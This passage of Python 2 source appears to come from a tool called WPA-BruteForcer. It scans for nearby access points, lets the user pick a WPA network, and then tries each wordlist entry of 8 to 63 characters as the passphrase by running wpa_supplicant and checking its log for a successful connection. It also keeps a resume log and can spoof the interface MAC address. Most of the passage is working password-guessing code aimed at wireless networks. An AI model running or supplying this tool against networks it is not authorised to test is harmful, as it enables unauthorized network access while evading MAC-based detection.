            ti=ti+1
            if os.path.exists(Dst_Dir):
                if ShowDisplay=="1":
                    printc (" ",fcolor.SGreen + "   File moved to [ " + fcolor.SRed + DstFile + fcolor.SGreen + " ] ....","")
        if IsFileDirExist(Src_Dir)=="D":
            if Src_Dir!=RootSrcDir:
                print fcolor.SGreen + "        Removing Directory " + "[ " + fcolor.SWhite + Src_Dir + fcolor.CReset + fcolor.SGreen + " ] ...."
                Result=os.rmdir(Src_Dir)
    if ShowDisplay=="1":
        print fcolor.BGreen + "     Total [ " + fcolor.BRed + str(td) + fcolor.BGreen + " ] director(ies) and [ " + fcolor.BRed + str(ti) + fcolor.BGreen + " ] file(s) transfered.."
    return str(ti);

def CopyTree(RootSrcDir,RootDstDir,ShowDisplay):
    import shutil
    if ShowDisplay=="":
        ShowDisplay="0"

    ti=0
    td=0
    for Src_Dir, dirs, files in os.walk(RootSrcDir):
        Dst_Dir = Src_Dir.replace(RootSrcDir, RootDstDir)
        if Src_Dir!=RootSrcDir and Dst_Dir!=RootDstDir:
            td=td+1
            if ShowDisplay=="1":
                print fcolor.SGreen + "        Copying Directory " + "[ " + fcolor.SWhite + Src_Dir + fcolor.CReset + fcolor.SGreen + " ] to [ " + fcolor.SRed + Dst_Dir + fcolor.CReset + fcolor.SGreen + " ] ..."
        if not os.path.exists(Dst_Dir):
            os.mkdir(Dst_Dir)
        for file_ in files:
            SrcFile = os.path.join(Src_Dir, file_)
            DstFile = os.path.join(Dst_Dir, file_)
            if os.path.exists(DstFile):
                if ShowDisplay=="1":
                    print fcolor.SGreen + "        Replacing File " + fcolor.SRed + DstFile + fcolor.CReset + fcolor.SGreen + " ] ..."
                os.remove(DstFile)
                shutil.copy(SrcFile, Dst_Dir)
            else:
                if ShowDisplay=="1":
                    print fcolor.SGreen + "        Copy File " + "[ " + fcolor.SWhite + SrcFile + fcolor.CReset + fcolor.SGreen + " ] to [ " + fcolor.SRed + DstFile + fcolor.CReset + fcolor.SGreen + " ] ..."
                shutil.copy(SrcFile, Dst_Dir)
            ti=ti+1
            if os.path.exists(Dst_Dir):
                if ShowDisplay=="1":
                    printc (" ",fcolor.SGreen + "   File copied to [ " + fcolor.SRed + DstFile + fcolor.SGreen + " ] ....","")
    if ShowDisplay=="1":
        print fcolor.BGreen + "     Total [ " + fcolor.BRed + str(td) + fcolor.BGreen + " ] director(ies) and [ " + fcolor.BRed + str(ti) + fcolor.BGreen + " ] file(s) copied.."
    return str(ti);

def Explore(DirUrlName,ShowDisplay):
    if ShowDisplay=="":
        ShowDisplay=0
    Result=-1
    if DirUrlName!="":
        if ShowDisplay=="1":
            printc (" ",fcolor.SGreen + "Opening location [ " + fcolor.SRed + DirUrlName + fcolor.SGreen + " ] ...","")
        Result=os.system("xdg-open " + str(DirUrlName) + " > /dev/null 2>&1")
    return Result

def UninstallApplication():
    Ask=AskQuestion ("Are you sure you want to remove this application ?","y/N","","N","")
    if Ask=="y" or Ask=="Y":
        curdir=os.getcwd() + "/"
        CurFileLocation=curdir + ScriptName
        if os.path.exists(CurFileLocation)==True:
            printd("Delete File : " + CurFileLocation)
            result=os.remove(CurFileLocation)
        if os.path.exists("/usr/sbin/" + ScriptName)==True:
            printd("Delete File : " + "/usr/sbin/" + str(ScriptName))
            result=os.remove("/usr/sbin/" + ScriptName)
        if os.path.exists(appdir)==True:
            printd("Remove Path : " + appdir)
            result=RemoveTree(appdir,"")
        printc ("i", "Application successfully removed !!","")
        exit(0)
    else:
        printc ("i",fcolor.BWhite + "Uninstall aborted..","")
        exit(0)


def GetIWList(cmdMode,SELECTED_IFACE,RETRY):
    global AP_BSSIDList
    global AP_FREQList
    global AP_QUALITYList
    global AP_SIGNALList
    global AP_ENCKEYList
    global AP_ESSIDList
    global AP_MODEList
    global AP_CHANNELList
    global AP_ENCTYPEList
    if RETRY=="":
        AP_BSSIDList=[]
        AP_FREQList=[]
        AP_QUALITYList=[]
        AP_SIGNALList=[]
        AP_ENCKEYList=[]
        AP_ESSIDList=[]
        AP_MODEList=[]
        AP_CHANNELList=[]
        AP_ENCTYPEList=[]

    POPULATE=0
    if len(AP_BSSIDList)>0:
        Result=AskQuestion(fcolor.SGreen + "An existing list with [ " + fcolor.BRed + str(len(AP_BSSIDList)) + fcolor.SGreen + " ] records were found, " + fcolor.BGreen + "populate existing ?","Y/n","U","Y","1")
        if Result=="Y":
            POPULATE=1
        else:
            AP_BSSIDList=[]
            AP_FREQList=[]
            AP_QUALITYList=[]
            AP_SIGNALList=[]
            AP_ENCKEYList=[]
            AP_ESSIDList=[]
            AP_MODEList=[]
            AP_CHANNELList=[]
            AP_ENCTYPEList=[]
    cmdMode=cmdMode.upper()
    if cmdMode=="":
        cmdMode="ALL"
    Result=Run("ifconfig " + SELECTED_IFACE + " up","1")
    Result=printc (".","<$rs$>" + "Scanning for Access Point..Please wait..","")
    printl(Result,"1","")
    iwlistfile=appdir + "tmp/scan.lst"
    Result=Run("iwlist " + SELECTED_IFACE + " scanning > " + iwlistfile ,"0")
    printl(fcolor.BGreen + " [Completed]","1","")
    print ""
    statinfo = os.stat(iwlistfile)
    if statinfo.st_size==0:
        printc ("@",fcolor.SRed + "Scanning failed to get any access point..Retrying in 5 seconds..","5")
        GetIWList(cmdMode,SELECTED_IFACE,"1")
        return
    f = open( iwlistfile, "r" )
    AP_BSSID=""
    AP_FREQ=""
    AP_QUALITY=""
    AP_SIGNAL=""
    AP_ENCKEY=""
    AP_ESSID=""
    AP_MODE=""
    AP_CHANNEL=""
    AP_ENCTYPE=""
    if POPULATE=="1":
        printc (".","Populating current list...","")

    for line in f:
        line=line.replace("\n","").lstrip().rstrip()

        if line.find("Cell ")!=-1:
            if AP_BSSID!="" and AP_MODE!="":
                if AP_ENCTYPE=="" and AP_ENCKEY=="ON":
                    AP_ENCTYPE="WEP"
                if AP_ENCTYPE=="" and AP_ENCKEY=="OFF":
                    AP_ENCTYPE="OPEN"
                if AP_ENCTYPE=="WPA2/WPA":
                    AP_ENCTYPE=="WPA/WPA2"
                ADD=""
                if cmdMode=="ALL-S" and AP_ESSID.find("\\x")==-1 and AP_ESSID!="":
                    ADD="1"
                if cmdMode=="ALL":
                    ADD="1"
                if cmdMode=="WPA-S" and AP_ENCTYPE.find("WPA")!=-1 and AP_ESSID.find("\\x")==-1 and AP_ESSID!="" and len(AP_ESSID)>2:
                    ADD="1"
                if cmdMode=="WPA" and AP_ENCTYPE.find("WPA")!=-1:
                    ADD="1"
                if cmdMode=="WEP-S" and AP_ENCTYPE.find("WEP")!=-1 and AP_ESSID.find("\\x")==-1 and AP_ESSID!="" and len(AP_ESSID)>2:
                    ADD="1"
                if cmdMode=="WEP" and AP_ENCTYPE.find("WEP")!=-1:
                    ADD="1"
                if cmdMode=="OPN-S" and AP_ENCTYPE.find("OPEN")!=-1 and AP_ESSID.find("\\x")==-1 and AP_ESSID!="" and len(AP_ESSID)>2:
                    ADD="1"
                if cmdMode=="OPN" and AP_ENCTYPE.find("OPEN")!=-1:
                    ADD="1"
                if str(POPULATE)=="1":
                    if any(AP_BSSID in s for s in AP_BSSIDList):
                        ADD="0"
                if ADD=="1":
                    if int(AP_QUALITY[:2])<=35:
                        SNLColor=fcolor.IRed
                        BSNLColor=fcolor.BIRed
                    if int(AP_QUALITY[:2])>35 and int(AP_QUALITY[:2])<55:
                        SNLColor=fcolor.IYellow
                        BSNLColor=fcolor.BIYellow
                    if int(AP_QUALITY[:2])>=55:
                        SNLColor=fcolor.IGreen
                        BSNLColor=fcolor.BIGreen
                    if AP_ENCTYPE.find("WPA")!=-1:
                        AP_ENCTYPE=fcolor.IPink + AP_ENCTYPE
                        AP_BSSID=SNLColor + AP_BSSID
                    if AP_ENCTYPE.find("OPEN")!=-1:
                        AP_ENCTYPE=fcolor.IBlue + AP_ENCTYPE
                        AP_BSSID=SNLColor + AP_BSSID
                    if AP_ENCTYPE.find("WEP")!=-1:
                        AP_ENCTYPE=fcolor.ICyan + AP_ENCTYPE
                        AP_BSSID=SNLColor + AP_BSSID
                    AP_BSSIDList.append(str(AP_BSSID))
                    AP_FREQList.append(str(AP_FREQ))
                    AP_QUALITYList.append(SNLColor + str(AP_QUALITY))
                    AP_SIGNALList.append(SNLColor + str(AP_SIGNAL))
                    AP_ENCKEYList.append(str(AP_ENCKEY))
                    AP_ESSIDList.append(str(BSNLColor + AP_ESSID))
                    AP_MODEList.append(str(AP_MODE))
                    AP_CHANNELList.append(str(AP_CHANNEL))
                    AP_ENCTYPEList.append(str(AP_ENCTYPE))
                AP_BSSID=""
                AP_FREQ=""
                AP_QUALITY=""
                AP_CHANNEL=""
                AP_SIGNAL=""
                AP_ENCKEY=""
                AP_ESSID=""
                AP_MODE=""
                AP_ENCTYPE=""
                                
            POS=line.index('Address:')
            if POS>-1:
                POS=POS+9
                AP_BSSID=str(line[POS:])
        if AP_BSSID!="" and line.find("Channel:")!=-1:
            POS=line.index('Channel:')
            if POS>-1:
                POS=POS+8
                AP_CHANNEL=str(line[POS:])
        if AP_BSSID!="" and line.find("Frequency:")!=-1:
            POS=line.index('Frequency:')
            if POS>-1:
                POS=POS+10
                AP_FREQ=str(line[POS:])
                POS=AP_FREQ.index(' (')
                if POS>-1:
                    AP_FREQ=str(AP_FREQ[:POS])
        if AP_BSSID!="" and line.find("Quality=")!=-1:
            POS=line.index('Quality=')
            if POS>-1:
                POS=POS+8
                AP_QUALITY=str(line[POS:])
                POS=AP_QUALITY.index(' ')
                if POS>-1:
                    AP_QUALITY=str(AP_QUALITY[:POS])
        if AP_BSSID!="" and line.find("Signal level=")!=-1:
            POS=line.index('Signal level=')
            if POS>-1:
                POS=POS+13
                AP_SIGNAL=str(line[POS:])
        if AP_BSSID!="" and line.find("Encryption key:")!=-1:
            POS=line.index('Encryption key:')
            if POS>-1:
                POS=POS+15
                AP_ENCKEY=str(line[POS:]).upper()
        if AP_BSSID!="" and line.find("ESSID:")!=-1:
            POS=line.index('ESSID:')
            if POS>-1:
                POS=POS+6
                AP_ESSID=str(line[POS:])
        if AP_BSSID!="" and line.find("Mode:")!=-1:
            POS=line.index('Mode:')
            if POS>-1:
                POS=POS+5
                AP_MODE=str(line[POS:])
        if AP_BSSID!="" and line.find("WPA2 Version")!=-1:
            if AP_ENCTYPE!="": 
                if AP_ENCTYPE.find("WPA2")==-1:
                    AP_ENCTYPE=AP_ENCTYPE + "/WPA2"
            else:
                AP_ENCTYPE=AP_ENCTYPE + "WPA2"

        if AP_BSSID!="" and line.find("WPA Version")!=-1:
            if AP_ENCTYPE!="": 
                AP_ENCTYPE=AP_ENCTYPE + "/WPA"
            else:
                AP_ENCTYPE=AP_ENCTYPE + "WPA"
        AP_ENCTYPE=AP_ENCTYPE.replace("\n","")
        if AP_ENCTYPE=="WPA2/WPA":
            AP_ENCTYPE="WPA/WPA2"
    f.close()
    if AP_BSSID!="" and AP_MODE!="":
        if AP_ENCTYPE=="" and AP_ENCKEY=="ON":
            AP_ENCTYPE="WEP"
        if AP_ENCTYPE=="" and AP_ENCKEY=="OFF":
            AP_ENCTYPE="OPEN"
        if AP_ENCTYPE=="WPA2/WPA":
            AP_ENCTYPE=="WPA/WPA2"

        ADD=""
        if cmdMode=="ALL-S" and AP_ESSID.find("\\x")==-1 and AP_ESSID!="":
            ADD="1"
        if cmdMode=="ALL":
            ADD="1"
        if cmdMode=="WPA-S" and AP_ENCTYPE.find("WPA")!=-1 and AP_ESSID.find("\\x")==-1 and AP_ESSID!="" and len(AP_ESSID)>2:
            ADD="1"
        if cmdMode=="WPA" and AP_ENCTYPE.find("WPA")!=-1:
            ADD="1"
        if cmdMode=="WEP-S" and AP_ENCTYPE.find("WEP")!=-1 and AP_ESSID.find("\\x")==-1 and AP_ESSID!="" and len(AP_ESSID)>2:
            ADD="1"
        if cmdMode=="WEP" and AP_ENCTYPE.find("WEP")!=-1:
            ADD="1"
        if cmdMode=="OPN-S" and AP_ENCTYPE.find("OPEN")!=-1 and AP_ESSID.find("\\x")==-1 and AP_ESSID!="" and len(AP_ESSID)>2:
            ADD="1"
        if cmdMode=="OPN" and AP_ENCTYPE.find("OPEN")!=-1:
            ADD="1"
        if ADD=="1":
            if int(AP_QUALITY[:2])<=35:
                SNLColor=fcolor.IRed
                BSNLColor=fcolor.BIRed
            if int(AP_QUALITY[:2])>35 and int(AP_QUALITY[:2])<55:
                SNLColor=fcolor.IYellow
                BSNLColor=fcolor.BIYellow
            if int(AP_QUALITY[:2])>=55:
                SNLColor=fcolor.IGreen
                BSNLColor=fcolor.BIGreen
            if AP_ENCTYPE.find("WPA")!=-1:
                AP_ENCTYPE=fcolor.IPink + AP_ENCTYPE
                AP_BSSID=SNLColor + AP_BSSID
            if AP_ENCTYPE.find("OPEN")!=-1:
                AP_ENCTYPE=fcolor.IBlue + AP_ENCTYPE
                AP_BSSID=SNLColor + AP_BSSID
            if AP_ENCTYPE.find("WEP")!=-1:
                AP_ENCTYPE=fcolor.ICyan + AP_ENCTYPE
                AP_BSSID=SNLColor + AP_BSSID
            AP_BSSIDList.append(str(AP_BSSID))
            AP_FREQList.append(str(AP_FREQ))
            AP_QUALITYList.append(SNLColor + str(AP_QUALITY))
            AP_SIGNALList.append(SNLColor + str(AP_SIGNAL))
            AP_ENCKEYList.append(str(AP_ENCKEY))
            AP_ESSIDList.append(str(BSNLColor + AP_ESSID))
            AP_MODEList.append(str(AP_MODE))
            AP_CHANNELList.append(str(AP_CHANNEL))
            AP_ENCTYPEList.append(str(AP_ENCTYPE))
        AP_BSSID=""
        AP_FREQ=""
        AP_QUALITY=""
        AP_CHANNEL=""
        AP_SIGNAL=""
        AP_ENCKEY=""
        AP_ESSID=""
        AP_MODE=""
        AP_ENCTYPE=""

def SelectInterfaceToUse():
    printc ("i", fcolor.BRed + "Wireless Adapter Selection","")
    Result = GetInterfaceList("MAN")
    if Result==0:
        printc ("!", fcolor.SRed + "No wireless adapter adapter found !!","")
        exit()

    Result = CombineListing(IFaceList, MACList,UpDownList,IEEEList,StatusList,ModeList,IPList,ISerialList)
    if int(Result)>1:
        TitleList=['Sel','Iface','MAC Address','Up ?', 'IEEE','Status','Mode','IP Addr','Sr No']
        Result=QuestionFromList(TitleList, MergedSpaceList,MergedList,"Select the interface from the list","0")
        if Result=="0":
                 Result=AskQuestion(fcolor.SGreen + "You need to select a interface to use," + fcolor.BGreen + " retry ?","Y/n","U","Y","1")
                 if Result=="Y":
                     Result=SelectInterfaceToUse()
                     return Result
                 else:
                     exit(0)
        Result=int(Result)-1
        SELECTED_IFACE=IFaceList[int(Result)]
    else:
        SELECTED_IFACE=IFaceList[0]
    return SELECTED_IFACE;

def SelectESSIDFromList():

    Result = CombineListing(AP_ESSIDList, AP_BSSIDList,AP_ENCTYPEList,AP_CHANNELList,AP_FREQList,AP_SIGNALList,AP_QUALITYList,"")
    TitleList=['sn','ESSID','BSSID','ENC','CH','Freq', 'Signal', 'Quality',]
    Result=QuestionFromList(TitleList, MergedSpaceList,MergedList,"Select the ESSID from the list","1")
    if Result=="0":
        Result=AskQuestion(fcolor.SGreen + "You need to select a ESSID from the list to proceed," + fcolor.BGreen + " retry ?","Y/n","U","Y","1")
        if Result=="Y":
            GetIWList("WPA-S",SELECTED_IFACE,"1")
            Result=SelectESSIDFromList()
            return Result
        else:
            exit(0)

    if Result=="" or len(Result)==2 or Result.find("\\x")>-1:
        printc ("!!!","The selected item does not contain any ESSID, please select another.","")
        Result=SelectESSIDFromList()
        return Result
    return Result

def CheckRequiredFiles():
    WPAS="/sbin/wpa_supplicant"
    if IsFileDirExist(WPAS)!="F":
            DDict=Run("locate wpa_supplicant | sed -n '1p'","0")
            if DDict=="":
		printc ("!!!","WPA Supplicant must be installed inorder to use WPA Brute-Forcer !","")
		exit (0)

def ConvertByte(ibytes):
    import math
    lst=['Bytes', 'KB', 'MB', 'GB', 'TB', 'PB']
    i = int(math.floor(math.log(ibytes, 1024)))
    
    if i >= len(lst):
        i = len(lst) - 1
    return ('%.2f' + " " + lst[i]) % (ibytes/math.pow(1024, i))


def GetFileLine(filename,omitblank):
    global TotalLine
    global UsableLine
    TotalLine=0
    UsableLine=0
    if omitblank=="":
        omitblank="0"

    if omitblank=="1":
        with open(filename, 'r') as f: 
            lines = len(list(filter(lambda x: x.strip(), f)))
        TotalLine=lines
        UsableLine=lines
    if omitblank=="0":
        with open(filename) as f:
            lines=len(f.readlines())
        TotalLine=lines
        UsableLine=lines
    if omitblank=="2":
        lines=0
	with open(filename,"r") as f:
	    for line in f:
                sl=len(line.replace("\n",""))
                if sl>0:
                    TotalLine=TotalLine+1
                    if sl>=8 and sl<=63:
                        lines=lines+1
                        UsableLine=lines
    return lines
 
def AddTime(tm, secs):
    fulldate = datetime.datetime(tm.year, tm.month, tm.day, tm.hour, tm.minute, tm.second)
    fulldate = fulldate + datetime.timedelta(seconds=secs)
    return fulldate

def Percent(val, digits):
    val *= 10 ** (digits + 2)
    return '{1:.{0}f} %'.format(digits, floor(val) / 10 ** digits)

class Command(object):
    def __init__(self, cmd):
        self.cmd = cmd
        self.process = None

    def run(self, timeout):
        def target():
	    printd ("Thread started")
            self.process = subprocess.Popen(self.cmd, shell=True)
            self.process.communicate()
	    printd ("Thread Finish")

        thread = threading.Thread(target=target)
        thread.start()

        thread.join(timeout)
        if thread.is_alive():
	    printd ("Terminating process..")
            self.process.terminate()
            thread.join()
	    printd ("Process Terminated")


def TryKey(resultfile,SEEKED_PASSPHRASE,TIMEOUT):
    wpas_conf=tmpdir + "wpa_supplicant.conf"
    ps=subprocess.Popen("ifconfig " + str(SELECTED_IFACE) + " down" , shell=True, stdout=subprocess.PIPE)												
    ps=subprocess.Popen("killall wpa_supplicant > /dev/null 2>&1" , shell=True, stdout=subprocess.PIPE)	
    TIMEOUT=float(TIMEOUT)
    mcmd="wpa_supplicant -Dwext -i" + str(SELECTED_IFACE) + " -c " + wpas_conf + " -f " + resultfile + " > /dev/null 2>&1"
    printd (mcmd)
    command = Command(mcmd)
    TIMEOUT=float(TIMEOUT)
    command.run(timeout=TIMEOUT)
    FoundKey=""
    allline=""
    if os.path.exists(resultfile):
        ps=subprocess.Popen("cat " + resultfile , shell=True, stdout=subprocess.PIPE)	
        Result=ps.stdout.read()
#        print "File Content : " + str(Result)
        findstr="CTRL-EVENT-CONNECTED"
        ps=subprocess.Popen("cat " + resultfile + " | grep '" + findstr + "'" , shell=True, stdout=subprocess.PIPE)	
        Result=ps.stdout.read()
        if Result!="":
            FoundKey="1"
            printl (fcolor.BGreen + " Successful.... ","1","")
            print ""
            printc ("i",fcolor.BRed + "WPA Passphrase Found !!","")
            printc (" ",fcolor.BWhite + "ESSID\t[ " + fcolor.BRed + SELECTED_ESSID + fcolor.BWhite + " ]","")		
            printc (" ",fcolor.BWhite + "Passphrase\t[ " + fcolor.BRed + str(SEEKED_PASSPHRASE) + fcolor.BWhite + " ]","")
            return FoundKey;
        findstr="4-Way Handshake failed - pre-shared key may be incorrect"
        ps=subprocess.Popen("cat " + resultfile + " | grep '" + findstr + "'" , shell=True, stdout=subprocess.PIPE)	
        Result=ps.stdout.read()
        if Result!="":
            FoundKey="0"
            printl (fcolor.SRed + " Wrong Key !","1","")
            print ""
            return FoundKey;
        findstr="CTRL-EVENT-DISCONNECTED"
        ps=subprocess.Popen("cat " + resultfile + " | grep '" + findstr + "'" , shell=True, stdout=subprocess.PIPE)	
        Result=ps.stdout.read()
        if Result!="":
            FoundKey="0"
            printl (fcolor.SRed + " Wrong Key !","1","")
            print ""
            return FoundKey;
        FoundKey=""
	return FoundKey;

def BruteForceWPA(LastPass):
    LastSeek=LastPass
    linecount=0
    PromptCounter=0
    timefmt="%Y-%m-%d %H:%M:%S"
    AVG_TIMEOUT=TIMEOUT
    BRes=0
    bracket=fcolor.SWhite + "[" + fcolor.SGreen + "." + fcolor.SWhite + "]  " + fcolor.SGreen
    AVG_TIMESTART=datetime.datetime.now()

    if LastPass!="":
        printl (fcolor.SGreen + "     Locating [ " + fcolor.BWhite + str(LastPass) + fcolor.SGreen + " ].... ","0","")
    Result=DelFile(resultfile,"0")
    with open(SELECTED_DICT,"r") as f:
        for line in f:
            line=line.replace("\n","")
            sl=len(line)
            if sl>=8 and sl<=63:
                linecount=linecount+1
                RemainingKey=UsableLine-linecount
                if LastPass=="":
                    PromptCounter=PromptCounter+1
                    SEEKED_PASSPHRASE=line
                    printl (bracket + "Trying   [ " + fcolor.BWhite + str(SEEKED_PASSPHRASE) + fcolor.SGreen + " ].... " +  ""    ,"1","")
                    open(scanlog,"wb").write("ESSID::==" + str(SELECTED_ESSID) + "\n")
                    open(scanlog,"a+b").write("IFACE::==" + str(SELECTED_IFACE) + "\n")
                    open(scanlog,"a+b").write("DICT::==" + str(SELECTED_DICT) + "\n")
                    open(scanlog,"a+b").write("TIMEOUT::==" + str(TIMEOUT) + "\n")
                    open(scanlog,"a+b").write("PASSPHRASE::==" + str(LastSeek) + "\n")
                    open(scanlog,"a+b").write("LASTSCAN::==" + str(time.strftime(timefmt)) + "\n")
                    wpas_conf=tmpdir + "wpa_supplicant.conf"
                    ps=subprocess.Popen("wpa_passphrase " + str(SELECTED_ESSID) + " '" + SEEKED_PASSPHRASE + "' > " + wpas_conf, shell=True, stdout=subprocess.PIPE)
                    FoundKey=TryKey(resultfile,SEEKED_PASSPHRASE,TIMEOUT)
                    if FoundKey=="1":
                        PromptCounter=PromptCounter+1
                        open(scanlog,"wb").write("ESSID::==" + str(SELECTED_ESSID) + "\n")
                        open(scanlog,"a+b").write("IFACE::==" + str(SELECTED_IFACE) + "\n")
                        open(scanlog,"a+b").write("DICT::==" + str(SELECTED_DICT) + "\n")
                        open(scanlog,"a+b").write("TIMEOUT::==" + str(TIMEOUT) + "\n")
                        open(scanlog,"a+b").write("PASSPHRASE::==" + str(SEEKED_PASSPHRASE) + "\n")
                        open(scanlog,"a+b").write("LASTSCAN::==" + str(time.strftime(timefmt)) + "\n")
                        open(scanlog,"a+b").write("<<COMPLETED-FOUND>>" + "\n")
                        exit(0)
                    if FoundKey=="":
                        printl (fcolor.SRed + "Connection Error !!","1","")
                        print ""
                        EConnTimeOut=float(TIMEOUT)+15
                        printl (bracket + "Retrying [ " + fcolor.BWhite + str(SEEKED_PASSPHRASE) + fcolor.SGreen + " ] with " + str(EConnTimeOut) + " seconds delay.. ","1","")
                        FoundKey=TryKey(resultfile,SEEKED_PASSPHRASE,TIMEOUT)
                        if FoundKey=="1":
                            open(scanlog,"wb").write("ESSID::==" + str(SELECTED_ESSID) + "\n")
                            open(scanlog,"a+b").write("IFACE::==" + str(SELECTED_IFACE) + "\n")
                            open(scanlog,"a+b").write("DICT::==" + str(SELECTED_DICT) + "\n")
                            open(scanlog,"a+b").write("TIMEOUT::==" + str(TIMEOUT) + "\n")
                            open(scanlog,"a+b").write("PASSPHRASE::==" + str(SEEKED_PASSPHRASE) + "\n")
                            open(scanlog,"a+b").write("LASTSCAN::==" + str(time.strftime(timefmt)) + "\n")
                            open(scanlog,"a+b").write("<<COMPLETED-FOUND>>" + "\n")
                            exit(0)
                        if FoundKey=="":
                            print fcolor.SRed + "Failed !!" + fcolor.CReset + fcolor.White
                            ps=subprocess.Popen("killall wpa_supplicant > /dev/null 2>&1" , shell=True, stdout=subprocess.PIPE)	
                            printd ("Deleting Result File [ " + resultfile + " ]")
                            ps=subprocess.Popen("rm " + resultfile + " > /dev/null 2>&1" , shell=True, stdout=subprocess.PIPE)
                            open(scanlog,"a+b").write("PASSPHRASE::==" + str(SEEKED_PASSPHRASE) + "\n")
                            LastSeek=SEEKED_PASSPHRASE
                    ps=subprocess.Popen("killall wpa_supplicant > /dev/null 2>&1" , shell=True, stdout=subprocess.PIPE)	
                    time.sleep(0.5) 
                    ps=subprocess.Popen("ifdown " + str(SELECTED_IFACE) + " --force" , shell=True, stdout=subprocess.PIPE)

                    Result=DelFile(resultfile,"0")
                    LastSeek=SEEKED_PASSPHRASE
                    if PromptCounter==10:
                        PromptCounter=0
                        AVG_TIMESTOP=datetime.datetime.now()
                        AVG_TIMEELSPE = AVG_TIMESTOP - AVG_TIMESTART
                        AVG_TIMEELSPE=str(AVG_TIMEELSPE)
                        l = AVG_TIMEELSPE.split(':')
                        l2=l[2].split('.')
                        l[2]=l2[0]
                        completed=Percent(linecount / float(UsableLine),2)
                        TOTAL_TIMEOUT= int(l[0]) * 3600 + int(l[1]) * 60 + int(l[2])
                        AVG_TIMEOUT = int(TOTAL_TIMEOUT) / 10
                        adtab="\t"
                        RK=str(RemainingKey)
                        if len(RK)>5:
                            adtab=""
                        printc ("i",fcolor.BBlue + "Remain keys to try  :  " + fcolor.BYellow + str(RemainingKey) + fcolor.SWhite + adtab + "\t- " + str(completed) + " completed.","")
                        totalseconds=long(int(AVG_TIMEOUT) * int(RemainingKey))
                        esttimeuse=str(datetime.timedelta(seconds=totalseconds))
                        a = datetime.datetime.now()
                        added_datetime = AddTime(a, totalseconds)
                        printc ("  ",fcolor.BBlue + "Remaing Time Needed  : " + fcolor.BYellow + str(esttimeuse) + fcolor.SWhite + "\t- Basing on current average delay rate : " + str(AVG_TIMEOUT) + " seconds","")
                        printc ("  ",fcolor.BBlue + "Est. Completion      : " + fcolor.BYellow + str(added_datetime) ,"")
                        AVG_TIMESTART=datetime.datetime.now()
                if LastPass!="":
                    if line==LastPass:
                        printl (fcolor.BGreen + "     Resuming from last passphrase : " + fcolor.BRed + str(LastPass) + fcolor.BWhite + "...","0","")
                        print ""
                        LastPass=""
        print ""
        open(scanlog,"a+b").write("<<COMPLETED>>" + "\n")
        printc ("!!!","Dictionary exhausted without finding the correct key !","")

def ChangeHex(n):
    x = (n % 16)
    c = ""
    if (x < 10):
        c = x
    if (x == 10):
        c = "A"
    if (x == 11):
        c = "B"
    if (x == 12):
        c = "C"
    if (x == 13):
        c = "D"
    if (x == 14):
        c = "E"
    if (x == 15):
        c = "F"
    if (n - x != 0):
        Result=ChangeHex(n / 16) + str(c)
    else:
        Result=str(c)
    if len(Result)==1:
        Result="0" + str(Result)
    if len(Result)==3:
        Result=Result[-2:]
    return Result

def SpoofMAC(SELECTED_IFACE,ASSIGNED_MAC):

    if ASSIGNED_MAC=="":
        H1="00"
        H2=ChangeHex(randrange(255))
        H3=ChangeHex(randrange(255))
        H4=ChangeHex(randrange(255))
        H5=ChangeHex(randrange(255))
        H6=ChangeHex(randrange(255))
        ASSIGNED_MAC=str(H1) + ":" + str(H2) + ":" + str(H3) + ":" + str(H4) + ":" + str(H5) + ":" + str(H6) 

    Result=""
    ps=subprocess.Popen("ifconfig " + str(SELECTED_IFACE) + " | grep 'HWaddr' | tr -s ' ' | cut -d ' ' -f5" , shell=True, stdout=subprocess.PIPE, stderr=open(os.devnull, 'w'))	
    MACADDR=ps.stdout.read().replace("\n","").upper().replace("-",":")
    MACADDR=MACADDR[:17]
    if str(MACADDR)!=ASSIGNED_MAC:
        printc ("i",fcolor.BRed + "Spoofing [ " + str(SELECTED_IFACE) + " ] MAC Address","")
        printc (" ",fcolor.BBlue + "Existing MAC\t: " + fcolor.BWhite + str(MACADDR),"")
        printc (" ",fcolor.BBlue + "Spoof MAC\t\t: " + fcolor.BWhite +  str(ASSIGNED_MAC),"")
        Result=MACADDR
        Ask=AskQuestion("Continue to spoof the MAC Address ?","Y/n","U","Y","0")
        if Ask=="Y":
            ps=subprocess.Popen("ifconfig " + str(SELECTED_IFACE) + " down hw ether " + str(ASSIGNED_MAC) + " > /dev/null 2>&1" , shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'))
            ps=subprocess.Popen("ifconfig " + str(SELECTED_IFACE) + " up > /dev/null 2>&1" , shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'))
            time.sleep(1)
            ps=subprocess.Popen("ifconfig " + str(SELECTED_IFACE) + " | grep 'HWaddr' | tr -s ' ' | cut -d ' ' -f5" , shell=True, stdout=subprocess.PIPE)
            NEWADDR=""
            NEWADDR=ps.stdout.read().replace("\n","").upper().replace("-",":")
            NEWADDR=NEWADDR[:17]

            if str(NEWADDR)==str(ASSIGNED_MAC):
                printc (" ",fcolor.BBlue + "MAC Address successfully changed to [ " + fcolor.BYellow + str(ASSIGNED_MAC) + fcolor.BBlue + " ]","")
                Result=str(ASSIGNED_MAC)
            else:
                printc (" ",fcolor.BRed + "Failed to change MAC Address !!","")
                Ask=AskQuestion("Retry with a new MAC Address ?","Y/n","U","Y","0")
                if Ask=="Y":
                    Result=SpoofMAC(SELECTED_IFACE,"")
                    return Result;
                else:
                    printc (" ",fcolor.BRed + "You choose to abort spoofing of MAC address.","")
                    printc (" ",fcolor.BBlue + "Using MAC Address [ " + fcolor.BYellow + str(NEWADDR) + fcolor.BBlue + " ]","")
                    return Result
        else:
            printc (" ",fcolor.BRed + "You choose to abort spoofing of MAC address.","")
            printc (" ",fcolor.BBlue + "Using MAC Address [ " + fcolor.BYellow + str(MACADDR) + fcolor.BBlue + " ]","")
    return Result


from random import randrange
from math import floor
global NullOut
DebugMode="0"
printd("Main Start Here -->")
cmdline=len(sys.argv)
TWidth=103
ProxyType="0"
tmpfile='/tmp/ipinfo'
global InfoIP
InfoIP=""
InfoIPVia=""
InfoIPFwd=""
TimeStart=""
appdir="/SYWorks/WPA-BruteForcer/"
PathList = ['tmp/']
tmpdir=appdir + "tmp/"
PrevIconCount=0
NullOut=" > /dev/null 2>&1"
scanlog=tmpdir + "wpa-bruteforce.log"
resultfile=tmpdir + "wpa-result.log"

try:
    GetAppName()
    CheckLinux()
    CheckPyVersion("2.7")
    os.system('clear')
    DisplayAppDetail()
    DisplayDisclaimer()
    CheckAppLocation()
    CheckRequiredFiles()
    GetParameter("1")
    RETRY=0

    PrevLogFound=0

    if os.path.exists(scanlog):
